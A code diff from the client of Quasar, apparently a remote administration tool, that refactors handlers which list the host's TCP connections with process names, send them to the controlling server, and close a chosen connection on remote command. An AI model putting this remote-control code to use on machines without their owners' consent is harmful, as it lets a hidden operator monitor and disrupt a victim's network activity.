@@ -2,7 +2,9 @@
 using System.Diagnostics;
 using System.Net;
 using System.Runtime.InteropServices;
+using Quasar.Common.Enums;
 using Quasar.Common.Messages;
+using Quasar.Common.Models;
 using xClient.Core.Networking;
 
 namespace xClient.Core.Commands
@@ -14,54 +16,48 @@ namespace xClient.Core.Commands
         public static void HandleGetConnections(Client client, GetConnections packet)
         {
             var table = GetTable();
-            var processes = new string[table.Length];
-            var localAddresses = new string[table.Length];
-            var localPorts = new string[table.Length];
-            var remoteAddresses = new string[table.Length];
-            var remotePorts = new string[table.Length];
-            var states = new byte[table.Length];
 
-            for (var i = 0; i < table.Length; i++)
+            var connections = new TcpConnection[table.Length];
+
+            for (int i = 0; i < table.Length; i++)
             {
-                localAddresses[i] = table[i].LocalAddress.ToString();
-                localPorts[i] = table[i].LocalPort.ToString();
-                remoteAddresses[i] = table[i].RemoteAddress.ToString();
-                remotePorts[i] = table[i].RemotePort.ToString();
-                states[i] = Convert.ToByte(table[i].state);
-
+                string processName;
                 try
                 {
-                    var p = Process.GetProcessById((int) table[i].owningPid);
-                    processes[i] = p.ProcessName;
+                    var p = Process.GetProcessById((int)table[i].owningPid);
+                    processName = p.ProcessName;
                 }
                 catch
                 {
-                    processes[i] = string.Format("PID: {0}", table[i].owningPid);
+                    processName = $"PID: {table[i].owningPid}";
                 }
+
+                connections[i] = new TcpConnection {
+                    ProcessName = processName,
+                    LocalAddress = table[i].LocalAddress.ToString(),
+                    LocalPort = table[i].LocalPort,
+                    RemoteAddress = table[i].RemoteAddress.ToString(),
+                    RemotePort = table[i].RemotePort,
+                    State = (ConnectionState) table[i].state};
             }
 
-            client.Send(new GetConnectionsResponse
-            {
-                Processes = processes,
-                LocalAddresses = localAddresses,
-                LocalPorts = localPorts,
-                RemoteAddresses = remoteAddresses,
-                RemotePorts = remotePorts,
-                States = states
-            });
+            client.Send(new GetConnectionsResponse {Connections = connections});
         }
 
         public static void HandleDoCloseConnection(Client client, DoCloseConnection packet)
         {
             var table = GetTable();
-            var matchFound = false; // handle if connections's ports found
+            var matchFound = false;
+
             for (var i = 0; i < table.Length; i++)
             {
-                //search for connection by Local and Remote Ports
-                if ((packet.LocalPort.ToString() == table[i].LocalPort.ToString()) &&
-                    (packet.RemotePort.ToString() == table[i].RemotePort.ToString()))
-                    // it will close the connection only if client run as admin
+                //search for connection
+                if (packet.LocalAddress == table[i].LocalAddress.ToString() &&
+                    packet.LocalPort == table[i].LocalPort &&
+                    packet.RemoteAddress == table[i].RemoteAddress.ToString() &&
+                    packet.RemotePort== table[i].RemotePort)
                 {
+                    // it will close the connection only if client run as admin
                     matchFound = true;
                     //table[i].state = (byte)ConnectionStates.Delete_TCB;
                     table[i].state = 12; // 12 for Delete_TCB state
@@ -70,6 +66,7 @@ namespace xClient.Core.Commands
                     SetTcpEntry(ptr);
                 }
             }
+
             if (matchFound)
             {
                 HandleGetConnections(client, new GetConnections());
